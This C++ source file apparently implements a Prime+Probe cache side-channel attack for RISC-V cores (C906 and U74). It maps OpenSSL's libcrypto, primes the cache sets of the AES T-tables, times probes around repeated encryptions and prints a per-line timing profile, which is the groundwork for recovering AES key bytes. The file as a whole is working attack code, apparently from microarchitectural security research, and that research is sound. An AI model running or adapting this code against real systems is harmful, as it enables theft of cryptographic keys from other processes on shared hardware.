#include "../../rlibsc.h"
#include <fcntl.h>
#include <map>
#include <openssl/aes.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <vector>

// this number varies on different systems
#ifdef C906
#define MIN_CACHE_PROBE_CYCLES 560
#elif defined(U74)
#define MIN_CACHE_PROBE_CYCLES 90
#endif

// more encryptions show features more clearly
#define NUMBER_OF_ENCRYPTIONS (1000)

char buffer[2 * 1024 * 1024];

#define S 12

#ifdef C906
static inline void prime(void *addr) {
  size_t pset = (((size_t)addr) >> 6) & 63;
  int pn = ((size_t)addr) & 4096;
  int bufpn = ((size_t)buffer) & 4096;
  int i = 1;
  int j = (pn == bufpn) ? 0 : 1;
  REP4(maccess(buffer + i++ * 2 * 4096 + j * 4096 + (pset << 6));)
}
#elif defined(U74)

static inline void prime(void *addr) {
  size_t start =
      (((size_t)(buffer) >> 14) << 14) + 0x4000 + ((size_t)addr & 0x3fff);
  for (int s = 0; s < 6; s += 1) {
    for (int d = 0; d < 1; d++) {
      for (int c = 0; c < 3; c++) {
        maccess((void *)(start + ((s + c) << S)));
      }
    }
  }
  asm volatile("fence\t\n");
}
#endif

size_t measure_probe_time(void *address) {
  uint64_t x = rdcycle();
  prime(address);
  uint64_t y = rdcycle();
  return y - x;
}

unsigned char key[] = {
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    // 0x51, 0x4d, 0xab, 0x12, 0xff, 0xdd, 0xb3, 0x32, 0x52, 0x8f, 0xbb, 0x1d,
    // 0xec, 0x45, 0xce, 0xcc, 0x4f, 0x6e, 0x9c, 0x2a, 0x15, 0x5f, 0x5f, 0x0b,
    // 0x25, 0x77, 0x6b, 0x70, 0xcd, 0xe2, 0xf7, 0x80
};

size_t sum;
size_t scount;

std::map<char *, std::map<size_t, size_t>> timings;

char *base;
char *probe;
char *end;

int main() {
  int fd = open(LIBCRYPTO_PATH, O_RDONLY);
  size_t size = lseek(fd, 0, SEEK_END);
  if (size == 0)
    exit(-1);
  size_t map_size = size;
  if ((map_size & 0xFFF) != 0) {
    map_size |= 0xFFF;
    map_size += 1;
  }
  base = (char *)mmap(0, map_size, PROT_READ, MAP_SHARED, fd, 0);
  end = base + size;

  // eviction candidates
  memset(buffer, 2, sizeof(buffer));

  unsigned char __attribute__((aligned(4096)))
  plaintext[] = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
  unsigned char ciphertext[128];
  unsigned char restoredtext[128];

  AES_KEY key_struct;

  AES_set_encrypt_key(key, 128, &key_struct);

  uint64_t min_time = rdcycle();
  srand(min_time);
  sum = 0;
  for (size_t byte = 0; byte < 256; byte += 16) {
    plaintext[0] = byte;
    // plaintext[1] = byte;
    // plaintext[2] = byte;
    // plaintext[3] = byte;

    AES_encrypt(plaintext, ciphertext, &key_struct);

    // adjust me (decreasing order)
    int te0 = TE0; // 0x128f10;
    int te1 = TE1; // 0x128f10;
    int te2 = TE2; // 0x128f10;
    int te3 = TE3; // 0x128f10;

    // adjust address range to exclude unwanted lines/tables
    // nm <libcrypto.so address> | grep Te
    for (probe = base + te3; probe < base + te0 + 16 * 64;
         probe += 64) // hardcoded addresses (could be done dynamically)
    // for (probe = base; probe < end; probe += 64)
    {
      size_t count = 0;
      for (size_t i = 0; i < NUMBER_OF_ENCRYPTIONS; ++i) {
        // sched_yield();
        for (size_t j = 1; j < 16; ++j)
          plaintext[j] = rand() % 256;

        REP2(prime(probe);)

        // fence();
        AES_encrypt(plaintext, ciphertext, &key_struct);
        fence();
        // maccess(probe); //fence();

        size_t delta = measure_probe_time(probe);
        if (delta > MIN_CACHE_PROBE_CYCLES)
          ++count;
      }
      timings[probe][byte] = count;
    }
  }

  for (auto ait : timings) {
    printf("%p", (void *)(ait.first - base));
    for (auto kit : ait.second) {
      int s = kit.second - NUMBER_OF_ENCRYPTIONS / 100 * 95;
      printf(",%4d", s < 0 ? 0 : s);
      // printf(",%6lu", kit.second);
    }
    printf("\n");
  }
  /*
  for (auto ait : timings)
  {
    for (auto kit : ait.second)
    {
      if (kit.second != 0)
      {
        printf("%p", (void*) (ait.first - base));
        printf(",%6lu", kit.second);
      }
    }
  }
  */

  close(fd);
  munmap(base, map_size);
  fflush(stdout);
  return 0;
}